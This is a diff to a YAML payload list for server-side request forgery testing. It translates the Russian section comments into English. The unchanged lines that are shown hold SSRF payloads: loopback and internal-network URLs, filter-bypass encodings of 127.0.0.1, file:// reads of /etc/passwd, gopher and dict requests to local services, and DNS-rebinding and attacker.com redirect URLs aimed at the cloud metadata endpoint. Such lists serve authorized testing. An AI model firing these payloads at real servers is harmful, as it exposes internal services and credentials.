@@ -41,7 +41,7 @@ payloads:
   - "http://[::1]/"
   - "http://0/"
 
-  # --- Внутренние сети ---
+  # --- Internal networks ---
   - "http://10.0.0.1/"
   - "http://10.0.0.1:80/"
   - "http://192.168.0.1/"
@@ -49,7 +49,7 @@ payloads:
   - "http://172.16.0.1/"
   - "http://172.17.0.1/"
 
-  # --- Обход фильтров ---
+  # --- Filter bypass ---
   - "http://127.1/"
   - "http://0177.0.0.1/"
   - "http://2130706433/"
@@ -58,15 +58,15 @@ payloads:
   - "http://localtest.me/"
   - "http://spoofed.burpcollaborator.net/"
 
-  # --- Нестандартные схемы ---
+  # --- Non-standard schemes ---
   - "file:///etc/passwd"
   - "file:///C:/Windows/win.ini"
   - "dict://localhost:11211/stat"
   - "gopher://localhost:25/xHELO%20localhost"
   - "ftp://localhost/etc/passwd"
 
-  # --- SSRF через DNS rebinding ---
+  # --- SSRF via DNS rebinding ---
   - "http://make-169.254.169.254-rebind-169.254.169.254-rbndr.us.host.repro.vg/"
 
-  # --- SSRF через URL redirect ---
+  # --- SSRF via URL redirect ---
   - "http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/"
